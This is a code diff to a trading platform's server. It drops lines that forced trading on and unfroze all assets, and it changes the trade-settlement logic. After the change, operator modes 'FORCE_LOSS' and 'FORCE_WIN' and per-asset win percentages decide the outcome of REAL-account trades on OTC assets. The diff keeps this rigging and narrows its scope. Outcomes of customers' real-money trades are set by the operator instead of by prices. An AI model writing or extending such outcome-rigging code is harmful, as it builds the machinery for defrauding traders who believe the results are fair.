@@ -1785,16 +1785,6 @@ async function startServer() {
     db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)').run('platform_settings', JSON.stringify(settings));
   };
 
-  // Force trading to be enabled and reset all assets as requested by user to 'turn everything on'
-  globalPlatformSettings.isTradingEnabled = true;
-  Object.keys(assets).forEach(symbol => {
-    if (assets[symbol]) {
-      assets[symbol].isFrozen = false;
-      assets[symbol].isWeekendFrozen = false;
-    }
-  });
-  savePlatformSettings(globalPlatformSettings);
-
   const saveReferralSettings = (settings: any) => {
     db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)').run('referral_settings', JSON.stringify(settings));
   };
@@ -2462,8 +2452,6 @@ async function startServer() {
       
       // Weekend market closure logic
       const day = new Date().getDay();
-      asset.isWeekendFrozen = false; // Always on as per user request
-      asset.isFrozen = false; // Ensure no frozen assets as requested
       
       let drift = 0;
       if (assetTargets[symbol]) {
@@ -2773,14 +2761,16 @@ async function startServer() {
     // Apply Global Automation Rules
     let forcedResult = null;
     
-    if (trade.accountType === 'REAL') {
+    const assetKey = trade.assetShortName || trade.asset;
+    const assetObj = assets[assetKey] || assets[trade.assetId] || assets[trade.symbol];
+    const isOTC = assetObj ? assetObj.isOTC : false;
+    
+    if (trade.accountType === 'REAL' && isOTC) {
       if (globalTradeSettings.mode === 'FORCE_LOSS') {
         forcedResult = 'LOSS';
       } else if (globalTradeSettings.mode === 'FORCE_WIN') {
         forcedResult = 'WIN';
       } else {
-        const assetKey = trade.assetShortName || trade.asset;
-        const assetObj = assets[assetKey] || assets[trade.assetId] || assets[trade.symbol];
         const winPercentage = (assetObj && assetObj.winPercentage !== undefined) 
           ? assetObj.winPercentage 
           : globalTradeSettings.winPercentage;
@@ -2930,7 +2920,6 @@ async function startServer() {
 
     // Store active trade
     // Use server-side payout to prevent client-side tampering or stale data
-    const assetKey = trade.assetShortName || trade.asset;
     const currentAsset = assets[assetKey as keyof typeof assets];
     const serverPayout = currentAsset?.payout || trade.payout || 80;
 
